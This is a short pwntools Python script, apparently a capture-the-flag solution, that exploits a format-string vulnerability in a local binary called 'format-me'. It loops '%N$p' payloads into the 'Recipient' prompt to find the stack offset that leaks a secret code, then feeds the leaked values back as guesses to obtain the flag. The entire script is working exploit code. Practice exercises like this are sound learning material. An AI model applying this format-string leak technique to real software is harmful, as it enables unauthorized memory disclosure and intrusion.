#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

exe = ELF("format-me")

r = process([exe.path])
# For debugging. Make sure to run `tmux` before running this 
# script with the following line uncommented
# gdb.attach(r)

# Your exploit script goes here

for i in range(1, 20):
    r.close()
    r = process([exe.path])
    payload = f'%{i}$p'.encode()
    r.recvuntil(b'Recipient? ')
    r.sendline(payload)
    output = str(r.recvline())
    try:
        code = output[(output.index('x')+1):(output.index('\\'))]
    except ValueError:
        continue
    code = f'{int(code, 16)}'.encode()
    r.recvuntil(b'Guess? ')
    r.sendline(code)
    feedback = r.recvline()
    if b'Correct' in feedback:
        print(f'Offset is {i}')
        r.close()
        break

r = process([exe.path])
for i in range(10):
    r.recvuntil(b'Recipient? ')
    r.sendline(payload)
    output = str(r.recvline())
    code = output[(output.index('x')+1):(output.index('\\'))]
    code = f'{int(code, 16)}'.encode()
    r.recvuntil(b'Guess? ')
    r.sendline(code)
r.recvline()    # receive one more time to only keep the flag line

# by reading the output


r.interactive()